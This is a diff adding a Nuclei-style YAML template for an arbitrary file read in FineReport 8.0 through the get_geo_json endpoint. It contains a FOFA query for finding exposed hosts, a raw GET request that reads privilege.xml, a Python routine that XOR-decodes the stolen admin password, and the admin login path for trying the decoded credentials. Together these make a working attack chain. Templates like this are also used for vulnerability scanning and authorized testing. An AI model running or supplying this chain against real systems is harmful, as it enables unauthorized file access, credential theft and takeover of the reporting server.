@@ -1,0 +1,39 @@
+id: finereport-v8-file-read
+
+info:
+  name: "帆软报表 V8 get_geo_json 接口任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="帆软-FineReport"
+        FineReport 8.0版本中存在文件读取漏洞，攻击者可通过此漏洞读取目标系统中的任意文件，获取加密凭证数据并实施解密操作。
+        解密实现（Python）
+
+        cipher = '___0022007c0039003b005100e3' #密文
+        PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23] #掩码
+        Password = ""
+        cipher = cipher[3:] #截断三位后
+        for i in range(int(len(cipher) / 4)):
+            c1 = int("0x" + cipher[i * 4:(i + 1) * 4], 16)
+            c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8]
+            Password = Password + chr(c2)
+        print (Password)
+
+        通过以下路径访问系统后台进行凭证验证
+
+        /WebReport/ReportServer?op=fs
+  tags: 帆软报表
+
+http:
+- raw:
+  - |
+    GET /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml  HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root'
